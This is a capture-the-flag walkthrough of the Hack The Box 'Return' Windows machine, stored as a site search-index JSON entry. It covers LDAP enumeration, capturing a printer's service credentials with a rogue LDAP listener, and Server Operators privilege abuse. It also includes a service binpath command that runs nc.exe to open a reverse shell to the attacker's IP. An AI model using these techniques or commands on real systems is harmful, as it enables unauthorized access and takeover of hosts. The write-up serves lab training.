leave it all in, bones and all, to show the real process, and help set realistic expectations for those entering the industry or tackling CTFs.\nUnfortunately, I\u0026rsquo;m just \u0026amp; I mean just, smart enough to know I\u0026rsquo;m dumb.\nGet in contact: – Get in touch bloodstiller at proton dot me\n",

    "http:\/\/localhost:1313\/walkthroughs\/return-box\/": {
        "title": "Return HTB Walkthrough: Active Directory, LDAP, and SeBackupPrivilege Exploitation",
        "tags": ["Box","HTB","Easy","Windows","LDAP",],
        "content": "Hack The Box Return Walkthrough/Writeup: https://app.hackthebox.com/machines/Return How I use variables \u0026amp; wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists Initial NMAP Scan \u0026amp; Start-Up Responder: I tend to run a very basic nmap scan initially so I can look for low hanging fruit that I can enumerate whilst my more in-depth scans are running:\nIn this case it\u0026rsquo;s very useful as we can see that ldap is runing which means we can do a significant amount of enumeration if anonymous bind is enabled. kali in ~ 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 11:12:51 zsh ❯ nmap $box Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-30 11:23 BST Nmap scan report for 10.129.95.241 Host is up (0.035s latency). Not shown: 988 closed tcp ports (conn-refused) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds Start Responder:\nAs this is a windows domain computer, I start responder running in the background. The liklihood of me getting any hits on a single box are slim but we dont\u0026rsquo; know if it\u0026rsquo;s been set to call out. kali in ~ 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 11:13:40 zsh ❯ sudo responder -wd -v -I tun0 [sudo] password for kali: __ Domain Name Discovery: Domain Name is return.local Whilst my NMAP Scan runs I use ldapsearch to discover the naming contexts of the domain, doing this enables me to check for further fine grained information. kali in ~ 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 11:13:51 zsh ❯ ldapsearch -H ldap://$box -x -s base namingcontexts # extended LDIF # # LDAPv3 # base \u0026lt;\u0026gt; (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingcontexts: DC=return,DC=local namingcontexts: CN=Configuration,DC=return,DC=local namingcontexts: CN=Schema,CN=Configuration,DC=return,DC=local namingcontexts: DC=DomainDnsZones,DC=return,DC=local namingcontexts: DC=ForestDnsZones,DC=return,DC=local # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 Brief explanation of naming contexts: Every Active Directory domain has a naming context (NC). The root of the naming context is represented by the domains distinguised name (DN/dn). This is often referred to as the \u0026ldquo;NC Head\u0026rdquo;. For example in this case, the return.local domain DN would be \u0026ldquo;DC=return,DC=local\u0026rdquo; as can be seen in the first returned line. This is the root of the directory that all other DN\u0026rsquo;s will be built on top of, e.g. if we had a user called Lex Huberman, their DN may be \u0026ldquo;CN=lex.huberman,CN=Users,DC=return,DC=local\u0026rdquo; (we can see the NC is the base/root that all other DN\u0026rsquo;s for the domain are built upon.) Checking For Ldap Anonymous bind: As we are dealing with ldap, as mentioned previously, I want to check if Anonymous Bind is enabled.\nIf you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapchecker It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in ~/Desktop/WindowsTools 🐍 v3.11.9 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 11:31:36 zsh ✖ python3 ldapchecker.py $box Attempting to connect to 10.129.95.241 with SSL... Failed to connect with SSL. Retrying without SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=return,DC=local CN=Configuration,DC=return,DC=local CN=Schema,CN=Configuration,DC=return,DC=local DC=DomainDnsZones,DC=return,DC=local DC=ForestDnsZones,DC=return,DC=local We have the domain functionaility level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=return,DC=local The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: Any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere\u0026rsquo;s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) So it appears it\u0026rsquo;s a printer server site of some sort. What is also interesting is the CN name \u0026ldquo;Configuration\u0026rdquo;, this could imply that it is still to be configured. Which is interesting as things that are still being configured may not have had thorough security stanards actioned. serverName: CN=PRINTER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=return,DC=local schemaNamingContext: It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. But wait there\u0026rsquo;s more…. Enumerating the Webserver \u0026amp; Getting a foothold: We can see a webserver running on the host: This is interesting as it\u0026rsquo;s a domain joined printer and this is the admin/settings page. For this printer to be able to operate and be used on the domain, it will have credentials stored. So we should be able to extract these. I stand up an nc listener \u0026amp; listen on ldap port 389 sudo nc -lvnp 389 I then enter my email address and click \u0026ldquo;Update\u0026rdquo; I immediately get a connection anda password is displayed. I verify the password is valid using netexec: Ldap Bind Information: I had wireshark running at this time to capture any interesting traffic \u0026amp; here we can see the POST request from the server \u0026amp; the subsequent LDAP BIND REQUEST to our malicious server. We can actually gather a significant amount of information from this packet. The version of LDAP being used. This particular printer is using 2, however the most recent version is 3. The name of the client/user making the request: return\\svc-printer The Authentication method: (0) Simple aka as clear text passwords. I connect to the host via Evil-Winrm: I want to be fully transparent here, I didn\u0026rsquo;t go straight to checking evil-winrm and connecting. Instead I messed around with SMB and enumerating the shares, which is not a bad thing but I should have realistically checked for this earlier. I hear you say \u0026ldquo;but why are you telling me this?\u0026rdquo; well, there are a lot of videos and writeups for boxes where people go \u0026ldquo;I did A,B,C \u0026amp; that\u0026rsquo;s how I owned this box in 3 minutes flat\u0026rdquo; but that\u0026rsquo;s not the reality of it, and it sets unrealistic expectations for people. In reality, you try various things and they fail and then you realize you missed something and do that. Granted this will improve with time and methodology however It\u0026rsquo;s not true when you are starting out \u0026amp; that is okay.\nI connect \u0026amp; check my users privs:\nI can see that I have the SeBackupPrivilege which effectivley means I have NT AUTHORITY SYSTEM.\nI check my group membership and can see I am part of the Server Operators:\nThis is a high-privileged group: The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.\nWe get the below capabilites by being part of this group: Interactive sign-in to servers. Create and delete network shared resources. Start and stop services. Back up and restore files. As seen in SeBackupPrivilege \u0026amp; SeRestorePrivilege Format the hard disk drive. Shut down the computer. \u0026ldquo;why SeBackupPrivilege\u0026rdquo; is dangerous: Here is why SeBackupPrivilege is so dangerous if we control a user who has the privilege: The privilege will let us copy ANY file from a folder, even if there is no access control entry (ACE) for us in the folder\u0026rsquo;s access control list (ACL) However, we can\u0026rsquo;t do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the FILE_FLAG_BACKUP_SEMANTICS flag. E.G. Use Diskshadow.exe Some more fun facts about this privilege: Members of the Backup Operators Group \u0026amp; Server Operators Group get this privilege by default: Provides read access to all files and directories for backup purposes, bypassing standard permissions. Allows a process to read any file, regardless of the file\u0026rsquo;s permissions. Used primarily for backup applications that need access to all files. Does not enable writing or deleting files, only reading. Security Considerations High potential for abuse if granted to unauthorized applications or users. Should be closely monitored and restricted to trusted applications and personnel. Path to NT Authority\\System course correction: Inititally I actually went down the path of dumping the registry hives for a SAM attack. As we do not have access to an actual domain controller so a DC Sync/Dumping NTDS.dit attack was no feasible. Just getting NT Locally would be enough to meet our needs. However when performing this attack I was successul in extracting the administrators hash but all pass the hash attacks (PTH) and attempts to login is as the administrator would not work, so the account login must be restricted locally. So now it\u0026rsquo;s a case of looking at the other capabilites that we have as members of the \u0026ldquo;Server Operators\u0026rdquo; Group, e.g. the ability to start \u0026amp; stop processes. Enumerating Services: I try various ways to enumerate the processes \u0026amp; services manually using inbuilt tools in windows, however these are all denied. Processes: Services: Trying SharpUp: Evil-Winrm: I didn\u0026rsquo;t know this previously bu as we are using evil-winrm it has the ability to enumerate services that are running by running the services command even if other methods do not work. Here we can see that the VGAutheService.exe binary is running as a privileged user/NT Authority System and the service name is VGAuthService I tried to enumerate if the service path was modifiable but all my efforts were denied. I am going to attempt to attack it anyway. I was able to query if I could stop it, which I can: Attacking the Bin Path \u0026amp; Getting System: I am going to see if I can modify the binaries path to point to a binary I control, e.g. NC or a reverse shell. I will then stop the service \u0026amp; restart it again. As the service runs as NT Authority\\System it should run my binary with elevate privileges. +Note+: Sometimes this is what it is, trying until we find the right route. Upload my binary, nc.exe Stand up my listener: Stop the process \u0026amp; ensure it has stopped: Modify the binary path to have cmd execute my nc.exe binary and connect back to my attack host: Explained: Initially I did just have the binpath be: sc.exe config VGAuthService binpath=\u0026quot;C:\\Users\\svc-printer\\Documents\\nc.exe -e cmd 10.10.14.131 9999\u0026quot; However it kept failing. After doing some digging I found out why. If we start a service process it will fail if the service MUST is not a Windows Service; which means the reverse shell will fail. Instead if we have cmd launch and then run our reverse shell even if the service fails our reverse shell will persist as it will be backgrounded. Information here: https://learn.microsoft.com/en-gb/windows/win32/api/winsvc/nc-winsvc-lpservice_main_functiona?redirectedfrom=MSDN Start the process: Profit Lessons Learned: What did I learn? I learned how to extract hardcoded LDAP credentials from hosts by using a malicious LDAP server. I learned that we can enumerate running services using evil-winrm. I learned that if we modify a service to run a custom binary it will fail unless we execute it using cmd as services will fail if they are not a Windows Service. Information here: https://learn.microsoft.com/en-gb/windows/win32/api/winsvc/nc-winsvc-lpservice_main_functiona?redirectedfrom=MSDN What silly mistakes did I make? I did not try and connect with Evil-Winrm sooner, this isn\u0026rsquo;t a terrible mistake as I was acively enumerating SMB but it is low hangin fruit that I could have seen sooner. I initially went after a local admin account, however this was not the right path to take. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/return-box\/"
    },
